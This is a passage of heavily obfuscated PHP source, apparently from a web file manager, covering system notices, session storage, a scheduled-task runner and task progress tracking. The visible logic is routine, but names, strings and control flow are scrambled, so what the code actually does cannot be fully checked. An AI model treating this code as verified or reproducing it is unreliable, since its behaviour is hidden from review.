E¹”Şè¾£˜: $dÊšŠ°òŠ‚[$aøí’ÏäŠß[1834]] = $f†•Âõˆ˜; $Câ¿ÇÏÂæÎ = json_decode($dÊšŠ°òŠ‚[$aøí’ÏäŠß[438]], !0); $dÊšŠ°òŠ‚[$aøí’ÏäŠß[2074]] = isset($Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[2074]]) ? $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[2074]] : $aøí’ÏäŠß[33]; goto D§˜¢ƒÜ; a°ª÷ù‚¢ò: $d‚õ¢´Ï†½ = $dÊšŠ°òŠ‚[$aøí’ÏäŠß[29]]; $f†•Âõˆ˜ = isset($E‰ìŞ„ÙŒª[$dÊšŠ°òŠ‚[$aøí’ÏäŠß[1514]]]) ? $E‰ìŞ„ÙŒª[$dÊšŠ°òŠ‚[$aøí’ÏäŠß[1514]]] : !1; $Bè…ôË‚Ü = strpos($d‚õ¢´Ï†½, $aøí’ÏäŠß[2081]) === 0 ? LNG($aøí’ÏäŠß[2082]) : LNG($aøí’ÏäŠß[2077]); goto a†”‰Û; F©•ƒ…à: unset($dÊšŠ°òŠ‚[$aøí’ÏäŠß[2083]]); $aŠó£†ØÃ÷[] = $dÊšŠ°òŠ‚; goto Fàõ­•‘Ğ; Fàõ­•‘Ğ: } $this->clearSystemPathLog($D’¬¬ïÈ ); goto eãÂ±«Üè®; eãÂ±«Üè®: return $aŠó£†ØÃ÷; goto FæÃ•Û¾†·; FæÃ•Û¾†·: } private function clearSystemPathLog($cÍâš¡İï) { $cœÊ´ŒŒ™µ =& $_SERVER[Šº]; if (count($cÍâš¡İï) == 0) { return; } $cŠèÁ ÍÉŒ = array($cœÊ´ŒŒ™µ[392] => array($cœÊ´ŒŒ™µ[7], array_unique($cÍâš¡İï))); $this->where($cŠèÁ ÍÉŒ)->delete(); } public function deviceList($aë›¶„ÕŸË, $D¦•ïõ¼Œ = 0) { $b›–šÎ•î‹ =& $_SERVER[Šº]; $Cñø¶ã™·„ = array($b›–šÎ•î‹[1514] => $aë›¶„ÕŸË, $b›–šÎ•î‹[193] => array($b›–šÎ•î‹[959], $D¦•ïõ¼Œ), $b›–šÎ•î‹[29] => $b›–šÎ•î‹[1617]); $F½÷ğïƒò = array(); $b„àâêæà = $this->field($b›–šÎ•î‹[2084])->where($Cñø¶ã™·„)->order($b›–šÎ•î‹[1902])->limit(50)->select(); foreach ($b„àâêæà as $eĞ†À–‚öÚ => $aÓØ«íŞª) { goto cŒ±Ù½®†¥; B‰÷÷¥ºéª: $this->ipAddress($aÓØ«íŞª); $aÓØ«íŞª[$b›–šÎ•î‹[438]] = $D¹í’õØ‹; $F½÷ğïƒò[$CÄ¶ÇâÜ†ç] = $aÓØ«íŞª; goto A´¾íÑÜÀİ; cŒ±Ù½®†¥: if ($eĞ†À–‚öÚ > 0 && abs($aÓØ«íŞª[$b›–šÎ•î‹[193]] - $b„àâêæà[$eĞ†À–‚öÚ - 1][$b›–šÎ•î‹[193]]) < 5) { continue; } $D¹í’õØ‹ = json_decode($aÓØ«íŞª[$b›–šÎ•î‹[438]], !0); $aÓØ«íŞª[$b›–šÎ•î‹[2074]] = isset($D¹í’õØ‹[$b›–šÎ•î‹[2074]]) ? $D¹í’õØ‹[$b›–šÎ•î‹[2074]] : $b›–šÎ•î‹[33]; goto cÔ¼Ü ÑÑ›; cÔ¼Ü ÑÑ›: unset($D¹í’õØ‹[$b›–šÎ•î‹[2074]]); $CÄ¶ÇâÜ†ç = $this->deviceType($D¹í’õØ‹[$b›–šÎ•î‹[1893]]); if (isset($F½÷ğïƒò[$CÄ¶ÇâÜ†ç])) { continue; } goto B‰÷÷¥ºéª; A´¾íÑÜÀİ: } return array_values($F½÷ğïƒò); } public function deviceType($BÇªîßãÃ¤) { return $BÇªîßãÃ¤; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\x6e\x6f\164\151\x63\x65\x4c\x69\163\x74"; public $field = array("\156\141\155\x65", "\143\157\156\164\145\x6e\164", "\141\165\164\x68", "\x6d\157\144\x65", "\x74\151\x6d\x65", "\164\171\x70\x65", "\x6c\145\x76\145\154", "\x65\x6e\x61\x62\154\x65", "\x73\x6f\162\164"); public function listData($Dğ¬ºĞ›âµ = false, $Eà–ÉÜ”ò¬ = "\x73\157\x72\x74", $cñ“¢íºÈ = false) { return parent::listData($Dğ¬ºĞ›âµ, $Eà–ÉÜ”ò¬, $cñ“¢íºÈ); } public function add($D¿ø“ñ¬õ) { $fìæ­àÀ¸” =& $_SERVER[Šº]; $D‘ºÁÕ¼Ó = time(); if ($D¿ø“ñ¬õ[$fìæ­àÀ¸”[12]] == $fìæ­àÀ¸”[2085]) { $D‘ºÁÕ¼Ó = strtotime($D¿ø“ñ¬õ[$fìæ­àÀ¸”[196]]); } $D¿ø“ñ¬õ[$fìæ­àÀ¸”[196]] = $D‘ºÁÕ¼Ó; return parent::insert($D¿ø“ñ¬õ); } public function update($cœ®šÃßÇ£, $d†Ò§ğ®Æ) { goto f£¹“§ëŒÓ; f£¹“§ëŒÓ: $eÀÏ¥˜ËÂ =& $_SERVER[Šº]; $C‹í¦••‘ = $this->listData($cœ®šÃßÇ£); if (!$C‹í¦••‘) { return !1; } goto F»àÊñ“å; F»àÊñ“å: $d¢ŠïÂÔñ“ = time(); if ($d†Ò§ğ®Æ[$eÀÏ¥˜ËÂ[12]] == $eÀÏ¥˜ËÂ[2085]) { $d¢ŠïÂÔñ“ = strtotime($d†Ò§ğ®Æ[$eÀÏ¥˜ËÂ[196]]); } $d†Ò§ğ®Æ[$eÀÏ¥˜ËÂ[196]] = $d¢ŠïÂÔñ“; goto Fˆ„ƒæñµƒ; Fˆ„ƒæñµƒ: return parent::update($cœ®šÃßÇ£, $d†Ò§ğ®Æ); goto aš¢ŠÁ¸­; aš¢ŠÁ¸­: } public function remove($BòãÁÆàô) { $dªøŒÓ‰¿ = $this->listData($BòãÁÆàô); if (!$dªøŒÓ‰¿ || $dªøŒÓ‰¿[$_SERVER[Šº][1157]]) { return !1; } return parent::remove($BòãÁÆàô); } public function sort($DšÏÈÉ ÇÅ, $Dî–ˆ¦æ†½) { return parent::update($DšÏÈÉ ÇÅ, $Dî–ˆ¦æ†½); } public function enable($B¡ã¡ÁÏ˜Š, $Aø†ŠÛóÈ«) { return parent::update($B¡ã¡ÁÏ˜Š, array($_SERVER[Šº][2086] => $Aø†ŠÛóÈ«)); } private function initUserOption() { $eŞ‘÷Ï³Ì¦ =& $_SERVER[Šº]; $this->optionType = $eŞ‘÷Ï³Ì¦[2087]; $this->modelType = $eŞ‘÷Ï³Ì¦[2088]; $this->field = array($eŞ‘÷Ï³Ì¦[2089], $eŞ‘÷Ï³Ì¦[28], $eŞ‘÷Ï³Ì¦[196], $eŞ‘÷Ï³Ì¦[29], $eŞ‘÷Ï³Ì¦[2090], $eŞ‘÷Ï³Ì¦[711], $eŞ‘÷Ï³Ì¦[189]); } public function userNoticeGet($bÇøÀì›“Ù = false) { $this->initUserOption(); return parent::listData($bÇøÀì›“Ù, $_SERVER[Šº][392], !0); } public function userNoticeAdd($Aµ®¢“˜‚±) { $BÀÉŒõ÷¾ò =& $_SERVER[Šº]; $this->initUserOption(); $c«ÓÛí±¤• = $this->findByKey($BÀÉŒõ÷¾ò[2089], $Aµ®¢“˜‚±[$BÀÉŒõ÷¾ò[392]]); if ($c«ÓÛí±¤•) { return !0; } $E´÷ªã†÷‹ = array($BÀÉŒõ÷¾ò[2089] => $Aµ®¢“˜‚±[$BÀÉŒõ÷¾ò[392]], $BÀÉŒõ÷¾ò[28] => $Aµ®¢“˜‚±[$BÀÉŒõ÷¾ò[28]], $BÀÉŒõ÷¾ò[196] => $Aµ®¢“˜‚±[$BÀÉŒõ÷¾ò[196]], $BÀÉŒõ÷¾ò[29] => isset($Aµ®¢“˜‚±[$BÀÉŒõ÷¾ò[29]]) ? $Aµ®¢“˜‚±[$BÀÉŒõ÷¾ò[29]] : 1, $BÀÉŒõ÷¾ò[2090] => isset($Aµ®¢“˜‚±[$BÀÉŒõ÷¾ò[2090]]) ? $Aµ®¢“˜‚±[$BÀÉŒõ÷¾ò[2090]] : 0, $BÀÉŒõ÷¾ò[711] => 0, $BÀÉŒõ÷¾ò[189] => 0); return parent::insert($E´÷ªã†÷‹); } public function userNoticeEdit($aùŸ”ñø‰í, $f—¢¾»‚…Î) { $this->initUserOption(); return parent::update($aùŸ”ñø‰í, $f—¢¾»‚…Î); } } goto a”¢‘ëÚ¢½; Aùâ›Æ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aÆñÑàîç­; FÉš…Ô¾Äõ: if (self::$sessionSign) { } else { if (Cookie::get($d§ö¸°¶·¹)) { self::$sessionSign = Cookie::get($d§ö¸°¶·¹); } else { self::$sessionSign = guid(); } } Cookie::setSafe($d§ö¸°¶·¹, self::$sessionSign, self::$sessionTime); $B¥ àò´Éß = $FŠ™âÃ­…[$cÛâÛ„ÓÄÈ[1476]]; goto fê¾î¬³¸; Dä…ÂªãÄ: $FŠ™âÃ­… = $GLOBALS[$cÛâÛ„ÓÄÈ[6]][$cÛâÛ„ÓÄÈ[346]]; self::$sessionTime = $FŠ™âÃ­…[$cÛâÛ„ÓÄÈ[1474]]; $d§ö¸°¶·¹ = isset($GLOBALS[$cÛâÛ„ÓÄÈ[1475]]) ? $GLOBALS[$cÛâÛ„ÓÄÈ[1475]] : SESSION_ID; goto FÉš…Ô¾Äõ; aÆñÑàîç­: $cÛâÛ„ÓÄÈ =& $_SERVER[Šº]; static $f±‰ŠŸ”Ï = false; if ($f±‰ŠŸ”Ï) { return $f±‰ŠŸ”Ï; } goto Dä…ÂªãÄ; fê¾î¬³¸: $Cˆ¥ŸŒ™â« = $FŠ™âÃ­…[$B¥ àò´Éß]; $c÷İ«œ¤ = $FŠ™âÃ­…[$cÛâÛ„ÓÄÈ[791]]; switch ($B¥ àò´Éß) { case $cÛâÛ„ÓÄÈ[17]: self::$handle = Model($cÛâÛ„ÓÄÈ[792]); break; case $cÛâÛ„ÓÄÈ[793]: self::$handle = new CacheRedis($Cˆ¥ŸŒ™â«, $c÷İ«œ¤); break; case $cÛâÛ„ÓÄÈ[794]: self::$handle = new CacheMemcached($Cˆ¥ŸŒ™â«, $c÷İ«œ¤); break; case $cÛâÛ„ÓÄÈ[192]: $Cˆ¥ŸŒ™â«[$cÛâÛ„ÓÄÈ[76]] = $Cˆ¥ŸŒ™â«[$cÛâÛ„ÓÄÈ[76]] . $cÛâÛ„ÓÄÈ[1477]; self::$handle = new CacheFile($Cˆ¥ŸŒ™â«, $c÷İ«œ¤); default: break; } goto b–¾˜éİÇ; b–¾˜éİÇ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $f±‰ŠŸ”Ï = new self(); return $f±‰ŠŸ”Ï; goto b÷°¨ÁŞƒ†; b÷°¨ÁŞƒ†: } public static function sign($bæ…§¶™¼‡ = false) { $bæ…§¶™¼‡ && (self::$sessionSign = $bæ…§¶™¼‡); self::init(); return self::$sessionSign; } public static function set($FÅ°¨Å…—‘, $Côæ•º›« = false) { self::init(); if (is_array($FÅ°¨Å…—‘)) { foreach ($FÅ°¨Å…—‘ as $a¡ë×âŞæ˜ => $C™®‘ã–„) { array_set_value(self::$data, $a¡ë×âŞæ˜, $C™®‘ã–„); } } else { array_set_value(self::$data, $FÅ°¨Å…—‘, $Côæ•º›«); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($AÖÛº…ÔŸß = false) { self::init(); if (!$AÖÛº…ÔŸß) { return self::$data; } return array_get_value(self::$data, $AÖÛº…ÔŸß); } public static function remove($eÔÆ©…—ß) { self::init(); unset(self::$data[$eÔÆ©…—ß]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Šº][796])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto Cí¹õ¥“‹¿; eö¢äã“ÜÆ: http_close(); self::valueSet($D®ÁéÃ‹[1478], $D®ÁéÃ‹[87]); Hook::bind($D®ÁéÃ‹[1480], $D®ÁéÃ‹[1481]); goto e±¢ƒòá§ò; Cí¹õ¥“‹¿: $D®ÁéÃ‹ =& $_SERVER[Šº]; if (self::valueGet($D®ÁéÃ‹[711]) != $D®ÁéÃ‹[87]) { return; } if (self::valueGet($D®ÁéÃ‹[1478]) == $D®ÁéÃ‹[87]) { $eÂìØÛ‰Œ = self::valueGet($D®ÁéÃ‹[1479]); if (time() - $eÂìØÛ‰Œ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto eö¢äã“ÜÆ; e±¢ƒòá§ò: while (!0) { self::cacheClear(); if (self::valueGet($D®ÁéÃ‹[711]) != $D®ÁéÃ‹[87]) { self::valueSet($D®ÁéÃ‹[1478], $D®ÁéÃ‹[504]); self::log($D®ÁéÃ‹[1482]); die; } self::valueSet($D®ÁéÃ‹[1478], $D®ÁéÃ‹[87]); self::valueSet($D®ÁéÃ‹[1479], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto B¸Â‘½˜Ëè; B¸Â‘½˜Ëè: } public static function restart() { $F‚ƒ¿áÁô =& $_SERVER[Šº]; http_close(); self::valueSet($F‚ƒ¿áÁô[711], $F‚ƒ¿áÁô[504]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($F‚ƒ¿áÁô[1478], $F‚ƒ¿áÁô[504]); self::valueSet($F‚ƒ¿áÁô[711], $F‚ƒ¿áÁô[87]); } public static function shutdownEvent() { $eÒÒ†ë™ßÕ =& $_SERVER[Šº]; self::valueSet($eÒÒ†ë™ßÕ[1478], $eÒÒ†ë™ßÕ[504]); self::log($eÒÒ†ë™ßÕ[1483]); } public static function config($e›ˆ¹é¶Ó‰, $d ÊŞ¶ƒ‡¨) { self::valueSet($_SERVER[Šº][711], $e›ˆ¹é¶Ó‰); } private static function taskRunAll() { goto BÓìÄ¿ğ†; BÓìÄ¿ğ†: $Eµ’…ßø¥± =& $_SERVER[Šº]; $d¦‰Š¿ˆÎ¢ = timeFloat(); $e¦ò³Ëàª = Model($Eµ’…ßø¥±[1484])->listData(); goto AëÁ¬ğÆ¦¸; eÊí‘›½Ìö: self::taskQueueRun($d¦‰Š¿ˆÎ¢); self::closeDatabase(); goto bóí‡ºâ”; AëÁ¬ğÆ¦¸: $cÒ øŒĞ¥è = count($e¦ò³Ëàª); for ($A‰˜¢÷æ· = 0; $A‰˜¢÷æ· < $cÒ øŒĞ¥è; $A‰˜¢÷æ·++) { $e¢óù“šÕ = $e¦ò³Ëàª[$A‰˜¢÷æ·]; if (!$e¢óù“šÕ[$Eµ’…ßø¥±[392]] || $e¢óù“šÕ[$Eµ’…ßø¥±[1485]] != $Eµ’…ßø¥±[87]) { continue; } if (!self::taskTimeCheck($e¢óù“šÕ)) { continue; } self::taskRun($e¢óù“šÕ); } Hook::trigger($Eµ’…ßø¥±[1486]); goto eÊí‘›½Ìö; bóí‡ºâ”: } private static function taskQueueRun($fµ¬ë˜°Î ) { $B‘Ş‰’´•Š = 10; while (!0) { $A¬‰˜è… = TaskQueue::run(); if ($A¬‰˜è… === !1) { break; } if (timeFloat() - $fµ¬ë˜°Î  >= $B‘Ş‰’´•Š) { break; } } } private static function taskTimeCheck($B§©İÈÚ¸) { goto f¾–È‡±åŒ; dÏ™â°¢æ: switch ($c’†™†¸¬[$a†²ğÌÄëã[29]]) { case $a†²ğÌÄëã[1493]: if (time() - $E¯½ÏÈ£­Ô < 3600 * 24 * 30) { return !1; } if ($c’†™†¸¬[$a†²ğÌÄëã[1493]] == date($a†²ğÌÄëã[1494]) && $EØôïœë„) { return !0; } break; case $a†²ğÌÄëã[1495]: if (time() - $E¯½ÏÈ£­Ô < 3600 * 24 * 7) { return !1; } $eó«ÄĞñì = date($a†²ğÌÄëã[1496]) == 0 ? 7 : date($a†²ğÌÄëã[1496]); if ($c’†™†¸¬[$a†²ğÌÄëã[1495]] == $eó«ÄĞñì && $EØôïœë„) { return !0; } break; case $a†²ğÌÄëã[1488]: if (time() - $E¯½ÏÈ£­Ô < 3600 * 24) { return !1; } if ($EØôïœë„) { return !0; } break; case $a†²ğÌÄëã[1497]: if (time() - $E¯½ÏÈ£­Ô >= floatval($c’†™†¸¬[$a†²ğÌÄëã[1497]]) * 60) { return !0; } break; default: break; } return !1; goto e‘íÕÊÆ; f¾–È‡±åŒ: $a†²ğÌÄëã =& $_SERVER[Šº]; $c’†™†¸¬ = json_decode($B§©İÈÚ¸[$a†²ğÌÄëã[196]], !0); $E¯½ÏÈ£­Ô = intval($B§©İÈÚ¸[$a†²ğÌÄëã[1479]]); goto aŸ«Ó¢¥ÏŞ; aŸ«Ó¢¥ÏŞ: $E­’ŒŠª‘ = strtotime($a†²ğÌÄëã[1487] . $c’†™†¸¬[$a†²ğÌÄëã[1488]] . $a†²ğÌÄëã[1489]) - strtotime($a†²ğÌÄëã[1490]); $dèæİ†¦ = time() - strtotime(date($a†²ğÌÄëã[1491]) . $a†²ğÌÄëã[1492]); $EØôïœë„ = $dèæİ†¦ >= $E­’ŒŠª‘ && $dèæİ†¦ <= $E­’ŒŠª‘ + 3600; goto dÏ™â°¢æ; e‘íÕÊÆ: } private static function closeDatabase() { goto DÅ‰»¹ŠÂÁ; c•ª¿‚£–ï: if (!$D‡Ü„æ·¬) { $D‡Ü„æ·¬ = time(); } if (time() - $D‡Ü„æ·¬ < $FÙïğ´òÒë) { return; } $D‡Ü„æ·¬ = time(); goto dÑÏ¨¯ÅÔŠ; dÑÏ¨¯ÅÔŠ: $B¯˜í©Òó… = Model($fù¡¦µ‘‹Ş[510])->db($fù¡¦µ‘‹Ş[33]); if ($B¯˜í©Òó…) { $B¯˜í©Òó…->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($fù¡¦µ‘‹Ş[1498], $fù¡¦µ‘‹Ş[1499]); die; } goto e¹Ú“³·Á²; DÅ‰»¹ŠÂÁ: $fù¡¦µ‘‹Ş =& $_SERVER[Šº]; static $D‡Ü„æ·¬ = 0; $FÙïğ´òÒë = 1800; goto c•ª¿‚£–ï; e¹Ú“³·Á²: } public static function taskRun($F‚“ÒÊï·Æ) { goto D‰°‰Ğ†…; BĞ°äñõ‘£: Model($A»ğ£©çØ‘[1504])->add(array($A»ğ£©çØ‘[1505] => $A»ğ£©çØ‘[33], $A»ğ£©çØ‘[1506] => $A»ğ£©çØ‘[504], $A»ğ£©çØ‘[29] => $A»ğ£©çØ‘[1507] . $F‚“ÒÊï·Æ[$A»ğ£©çØ‘[392]], $A»ğ£©çØ‘[1508] => json_encode(array($A»ğ£©çØ‘[28] => $F‚“ÒÊï·Æ[$A»ğ£©çØ‘[28]], $A»ğ£©çØ‘[1509] => timeFloat() - $BÀÁƒò¤, $A»ğ£©çØ‘[290] => $c¯ÜÓ¨Š×)))); self::log($A»ğ£©çØ‘[1510] . $F‚“ÒÊï·Æ[$A»ğ£©çØ‘[392]] . $A»ğ£©çØ‘[1511] . $c¯ÜÓ¨Š×); return !0; goto B’¡ö–•Çë; Bè‡›îà‘Í: $BÀÁƒò¤ = timeFloat(); $c¯ÜÓ¨Š× = $A»ğ£©çØ‘[33]; switch ($F‚“ÒÊï·Æ[$A»ğ£©çØ‘[29]]) { case $A»ğ£©çØ‘[304]: $FÙÂ±½™Ğ„ = url_request($F‚“ÒÊï·Æ[$A»ğ£©çØ‘[1503]], $A»ğ£©çØ‘[227], !1, !1, !1, !1, 5); $c¯ÜÓ¨Š× = strlen($FÙÂ±½™Ğ„); break; case $A»ğ£©çØ‘[226]: $c¯ÜÓ¨Š× = Hook::apply($F‚“ÒÊï·Æ[$A»ğ£©çØ‘[1503]]); default: break; } goto BĞ°äñõ‘£; D‰°‰Ğ†…: $A»ğ£©çØ‘ =& $_SERVER[Šº]; self::log($A»ğ£©çØ‘[1500] . $F‚“ÒÊï·Æ[$A»ğ£©çØ‘[392]] . $A»ğ£©çØ‘[1501] . $F‚“ÒÊï·Æ[$A»ğ£©çØ‘[28]] . $A»ğ£©çØ‘[1502] . $F‚“ÒÊï·Æ[$A»ğ£©çØ‘[1503]]); Model($A»ğ£©çØ‘[1484])->run($F‚“ÒÊï·Æ[$A»ğ£©çØ‘[392]]); goto Bè‡›îà‘Í; B’¡ö–•Çë: } private static function valueGet($CäÎøõ­£) { $DİÍ¨„™ñ =& $_SERVER[Šº]; $eïßÎ‡Š“« = $DİÍ¨„™ñ[1512]; $D‚Ş³÷Æ’‰ = Model($DİÍ¨„™ñ[1513])->get($CäÎøõ­£, $eïßÎ‡Š“«); if (is_null($D‚Ş³÷Æ’‰)) { Model($DİÍ¨„™ñ[1513])->set($DİÍ¨„™ñ[711], $DİÍ¨„™ñ[87], $eïßÎ‡Š“«); Model($DİÍ¨„™ñ[1513])->set($DİÍ¨„™ñ[1478], $DİÍ¨„™ñ[504], $eïßÎ‡Š“«); $D‚Ş³÷Æ’‰ = Model($DİÍ¨„™ñ[1513])->get($CäÎøõ­£, $eïßÎ‡Š“«); } return $D‚Ş³÷Æ’‰; } private static function valueSet($d¤ŸïÂõ, $FˆÀÕÀİğˆ) { $DÊ‹ôç©Ş =& $_SERVER[Šº]; return Model($DÊ‹ôç©Ş[1513])->set($d¤ŸïÂõ, $FˆÀÕÀİğˆ, $DÊ‹ôç©Ş[1512]); } protected static function log($c”¹ß¹‘¦Ê) { write_log($c”¹ß¹‘¦Ê, $_SERVER[Šº][1499]); } private static function cacheClear() { $fèƒòœ„« =& $_SERVER[Šº]; $A‹ïº«Äìî = Model($fèƒòœ„«[1513])->cacheKey($fèƒòœ„«[1512]); Cache::clearMemory($A‹ïº«Äìî); Model($fèƒòœ„«[1484])->cacheClear(); } } class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\x72\165\156\x6e\151\156\147"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($AŞï…Ãê¡, $d¯ÇÍ¦Ïªƒ = '', $AÎ¥…õš¼Ì = 0, $DÌ–Æ§õÅö = '') { goto aóÁÌîéĞ§; A…‘á™ƒìØ: $this->startAfter(); Hook::trigger($a„²’ù¦é‰[1524], $this->task); $this->task[$a„²’ù¦é‰[1517]] = timeFloat(); goto AÆ‘¨‘É˜‘; Aø´Ö½‘•í: $GLOBALS[$a„²’ù¦é‰[1520]] = 1; Hook::bind($a„²’ù¦é‰[1480], array($this, $a„²’ù¦é‰[1521])); Hook::bind($a„²’ù¦é‰[1522], array($this, $a„²’ù¦é‰[1523])); goto A…‘á™ƒìØ; aóÁÌîéĞ§: $a„²’ù¦é‰ =& $_SERVER[Šº]; if (self::get($AŞï…Ãê¡)) { return; } $this->task = array($a„²’ù¦é‰[392] => $AŞï…Ãê¡, $a„²’ù¦é‰[1514] => USER_ID, $a„²’ù¦é‰[1420] => $DÌ–Æ§õÅö, $a„²’ù¦é‰[29] => $d¯ÇÍ¦Ïªƒ, $a„²’ù¦é‰[1011] => $a„²’ù¦é‰[33], $a„²’ù¦é‰[1009] => $AÎ¥…õš¼Ì, $a„²’ù¦é‰[1024] => 0, $a„²’ù¦é‰[1515] => 0, $a„²’ù¦é‰[1516] => 0, $a„²’ù¦é‰[747] => timeFloat(), $a„²’ù¦é‰[746] => 0, $a„²’ù¦é‰[1517] => 0, $a„²’ù¦é‰[1518] => 0, $a„²’ù¦é‰[1519] => 0, $a„²’ù¦é‰[711] => $a„²’ù¦é‰[1478]); goto Aø´Ö½‘•í; AÆ‘¨‘É˜‘: } public function end() { goto F½İ¹ê½––; F½İ¹ê½––: $Bö³×ÅÏÎŒ =& $_SERVER[Šº]; if (!$this->task) { return; } if ($this->task[$Bö³×ÅÏÎŒ[1517]]) { self::valueSet($this->task[$Bö³×ÅÏÎŒ[392]], !1); } goto F¸°ßĞÂ; Cƒ§…¿—î£: Hook::unbind($Bö³×ÅÏÎŒ[1522], array($this, $Bö³×ÅÏÎŒ[1523])); $this->endAfter(); $this->task = !1; goto FÉæ½öâ; F¸°ßĞÂ: $BìßæÅÇÅù = timeFloat() - $this->task[$Bö³×ÅÏÎŒ[747]]; self::log($Bö³×ÅÏÎŒ[1525] . $this->task[$Bö³×ÅÏÎŒ[392]] . $Bö³×ÅÏÎŒ[1526] . $BìßæÅÇÅù . $Bö³×ÅÏÎŒ[1527]); Hook::unbind($Bö³×ÅÏÎŒ[1480], array($this, $Bö³×ÅÏÎŒ[1521])); goto Cƒ§…¿—î£; FÉæ½öâ: } public function update($cÌŞ‘¢„ö„ = 0, $Fƒ¾Ç‘ÍŒÊ = false) { goto e§Öñ‘¾Çš; EĞ¤å¨¿Æ¨: $Còƒï°›Œ = self::get($CŒŒ¤ïîæ‘[$f†£·ãğÕ[392]]); $a©Ü»—‰î = $Còƒï°›Œ[$f†£·ãğÕ[711]]; if ($a©Ü»—‰î == self::STATYS_KILL) { $DÈ±ôî¦ïµ = array($f†£·ãğÕ[1528] => LNG($f†£·ãğÕ[1529]), $f†£·ãğÕ[1074] => !1); Cache::set($f†£·ãğÕ[1530] . $this->task[$f†£·ãğÕ[392]], $DÈ±ôî¦ïµ, 30); $this->end(); die; } else { if ($a©Ü»—‰î == self::STATYS_STOP) { $aèÓ¬ Ü± = 2; $Còƒï°›Œ[$f†£·ãğÕ[1518]] += $aèÓ¬ Ü±; self::valueSet($CŒŒ¤ïîæ‘[$f†£·ãğÕ[392]], $Còƒï°›Œ); sleep($aèÓ¬ Ü±); $this->update(); return; } } goto eª½çªƒº‘; eª½çªƒº‘: $CŒŒ¤ïîæ‘[$f†£·ãğÕ[711]] = $a©Ü»—‰î ? $a©Ü»—‰î : $CŒŒ¤ïîæ‘[$f†£·ãğÕ[711]]; $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1518]] = $Còƒï°›Œ[$f†£·ãğÕ[1518]] ? $Còƒï°›Œ[$f†£·ãğÕ[1518]] : 0; $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1517]] = timeFloat(); goto FÄ¥™¨·; FÄ¥™¨·: Hook::trigger($f†£·ãğÕ[1531], $CŒŒ¤ïîæ‘); self::valueSet($CŒŒ¤ïîæ‘[$f†£·ãğÕ[392]], $CŒŒ¤ïîæ‘); goto Bè˜ÄØÜˆÛ; e§Öñ‘¾Çš: $f†£·ãğÕ =& $_SERVER[Šº]; $CŒŒ¤ïîæ‘ =& $this->task; if (!$CŒŒ¤ïîæ‘) { return; } goto Aù®²‡Åå; Aù®²‡Åå: $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1024]] += $cÌŞ‘¢„ö„; $CŒŒ¤ïîæ‘[$f†£·ãğÕ[746]] = timeFloat(); if ($CŒŒ¤ïîæ‘[$f†£·ãğÕ[1009]]) { if ($CŒŒ¤ïîæ‘[$f†£·ãğÕ[1009]] < $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1024]]) { $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1009]] = $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1024]]; } $bœø¸†¼ƒà = timeFloat() - $CŒŒ¤ïîæ‘[$f†£·ãğÕ[747]] - $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1518]]; $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1515]] = $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1024]] / $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1009]]; $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1516]] = $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1024]] / $bœø¸†¼ƒà; if ($CŒŒ¤ïîæ‘[$f†£·ãğÕ[1515]] > 0) { $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1519]] = $bœø¸†¼ƒà * (1 - $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1515]]) / $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1515]]; } $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1519]] = $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1519]] <= 0 ? 0 : $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1519]]; } goto b¤ÇšƒÓå; b¤ÇšƒÓå: $this->updateAfter(); $Dƒíßî’ğÒ = 0.2; if (timeFloat() - $CŒŒ¤ïîæ‘[$f†£·ãğÕ[1517]] < $Dƒíßî’ğÒ && !$Fƒ¾Ç‘ÍŒÊ) { return; } goto EĞ¤å¨¿Æ¨; Bè˜ÄØÜˆÛ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Cœåä¹ŠÑ®) { $B¦•˜Éô›ß =& $_SERVER[Šº]; Cache::set($B¦•˜Éô›ß[1530] . $this->task[$B¦•˜Éô›ß[392]], $Cœåä¹ŠÑ®, 60); return $Cœåä¹ŠÑ®; } public static function get($F°–ƒ¢‡ñ¿) { return self::valueGet($F°–ƒ¢‡ñ¿); } public static function listData() { $Dæ²†Œ£šœ = self::valueGet(); return array_sort_by($Dæ²†Œ£šœ, $_SERVER[Šº][747], !0); } public static function kill($a«‡’Ã÷éå) { return self::changeStatus($a«‡’Ã÷éå, self::STATYS_KILL); } public static function stop($fØ±İ•„©£) { return 